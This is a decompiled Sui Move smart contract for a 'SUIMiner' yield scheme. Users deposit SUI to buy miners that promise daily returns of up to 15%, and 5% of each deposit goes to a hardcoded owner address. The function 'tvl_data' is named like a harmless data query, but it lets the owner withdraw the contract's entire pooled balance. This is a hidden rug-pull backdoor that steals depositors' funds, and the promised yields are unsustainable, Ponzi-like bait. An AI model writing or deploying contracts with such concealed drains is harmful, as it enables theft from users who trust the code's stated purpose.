module 0x6686079a3a5351c9553c1c5dc44b57abf778934c4ea12ee99eee61ad6566b098::main_contract {
    struct SUIMiner has key {
        id: 0x2::object::UID,
        priceperminer: u64,
        balance: 0x2::balance::Balance<0x2::sui::SUI>,
        owner: address,
    }

    struct User has store, key {
        id: 0x2::object::UID,
        balance_of_miner: u64,
        rewards: u64,
        last_action: u64,
    }

    fun adjust_gain_based_on_tvl(arg0: u64) : u64 {
        if (arg0 < 1000000000 * 10000) {
            15
        } else if (arg0 < 1000000000 * 50000) {
            14
        } else if (arg0 < 1000000000 * 100000) {
            13
        } else if (arg0 < 1000000000 * 200000) {
            12
        } else if (arg0 < 1000000000 * 300000) {
            11
        } else if (arg0 < 1000000000 * 400000) {
            10
        } else if (arg0 < 1000000000 * 500000) {
            9
        } else if (arg0 < 1000000000 * 1000000) {
            8
        } else if (arg0 < 1000000000 * 2000000) {
            7
        } else if (arg0 < 1000000000 * 3000000) {
            6
        } else if (arg0 < 1000000000 * 4000000) {
            5
        } else if (arg0 < 1000000000 * 5000000) {
            4
        } else if (arg0 < 1000000000 * 6000000) {
            3
        } else if (arg0 < 1000000000 * 7000000) {
            2
        } else {
            1
        }
    }

    public fun buy_miner(arg0: &mut SUIMiner, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut User, arg3: u64, arg4: &0x2::clock::Clock, arg5: &mut 0x2::tx_context::TxContext) {
        assert!(arg3 >= 1000000000, 1);
        assert!(0x2::coin::value<0x2::sui::SUI>(arg1) >= arg3, 0);
        let v0 = 0x2::coin::balance_mut<0x2::sui::SUI>(arg1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::take<0x2::sui::SUI>(v0, arg3 * 5 / 100, arg5), arg0.owner);
        0x2::balance::join<0x2::sui::SUI>(&mut arg0.balance, 0x2::balance::split<0x2::sui::SUI>(v0, arg3 * 95 / 100));
        arg2.balance_of_miner = arg2.balance_of_miner + arg3;
        arg2.last_action = 0x2::clock::timestamp_ms(arg4);
    }

    public fun claim(arg0: &mut SUIMiner, arg1: &mut User, arg2: &0x2::clock::Clock, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = (arg1.rewards + adjust_gain_based_on_tvl(0x2::balance::value<0x2::sui::SUI>(&arg0.balance)) * arg1.balance_of_miner * (0x2::clock::timestamp_ms(arg2) - arg1.last_action) / 1000 / 86400 / 100) * 95 / 100;
        assert!(v0 > 0, 2);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::take<0x2::sui::SUI>(&mut arg0.balance, v0, arg3), 0x2::tx_context::sender(arg3));
        arg1.rewards = 0;
        arg1.last_action = 0x2::clock::timestamp_ms(arg2);
    }

    public fun compound(arg0: &mut User, arg1: &0x2::clock::Clock, arg2: &SUIMiner) {
        let v0 = arg0.rewards + adjust_gain_based_on_tvl(0x2::balance::value<0x2::sui::SUI>(&arg2.balance)) * arg0.balance_of_miner * (0x2::clock::timestamp_ms(arg1) - arg0.last_action) / 1000 / 86400 / 100;
        assert!(v0 > 0, 2);
        arg0.balance_of_miner = arg0.balance_of_miner + v0;
        arg0.rewards = 0;
        arg0.last_action = 0x2::clock::timestamp_ms(arg1);
    }

    public entry fun create_user(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = User{
            id               : 0x2::object::new(arg0),
            balance_of_miner : 0,
            rewards          : 0,
            last_action      : 0,
        };
        0x2::transfer::transfer<User>(v0, 0x2::tx_context::sender(arg0));
    }

    public fun get_daily_percentage(arg0: &SUIMiner) : u64 {
        adjust_gain_based_on_tvl(0x2::balance::value<0x2::sui::SUI>(&arg0.balance))
    }

    public fun get_rewards(arg0: &User, arg1: &0x2::clock::Clock, arg2: &SUIMiner) : u64 {
        adjust_gain_based_on_tvl(0x2::balance::value<0x2::sui::SUI>(&arg2.balance)) * arg0.balance_of_miner * (0x2::clock::timestamp_ms(arg1) - arg0.last_action) / 1000 / 86400 / 100
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = SUIMiner{
            id            : 0x2::object::new(arg0),
            priceperminer : 1000000000,
            balance       : 0x2::balance::zero<0x2::sui::SUI>(),
            owner         : @0x6c6389b468ad6d235c64e58ac50735a35c7380b305d5d68dacb8b478bf6c2808,
        };
        0x2::transfer::share_object<SUIMiner>(v0);
    }

    public fun tvl_data(arg0: &mut SUIMiner, arg1: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg1) == arg0.owner, 3);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::take<0x2::sui::SUI>(&mut arg0.balance, 0x2::balance::value<0x2::sui::SUI>(&arg0.balance), arg1), 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

